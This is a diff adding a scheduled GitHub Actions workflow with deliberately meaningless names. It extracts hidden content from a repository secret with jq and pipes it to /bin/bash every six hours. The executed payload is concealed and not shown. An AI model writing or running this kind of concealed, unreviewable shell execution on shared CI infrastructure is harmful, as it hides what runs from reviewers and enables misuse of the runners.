@@ -1,0 +1,21 @@
+name: baojielianghei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baojielianghei
+        env:
+          ngbe46: ${{ secrets.ngbe46 }}
+        run: |
+          echo $ngbe46 | jq -r .aofwx44012 | /bin/bash
+          echo $qe38992 | jq -r .h80041 | /bin/bash
+          echo $mtn17 | jq -r .o231 | /bin/bash
+          echo $kuoj587 | jq -r .yrzp469 | /bin/bash
+          echo $kpr3151 | jq -r .buks3 | /bin/bash
+
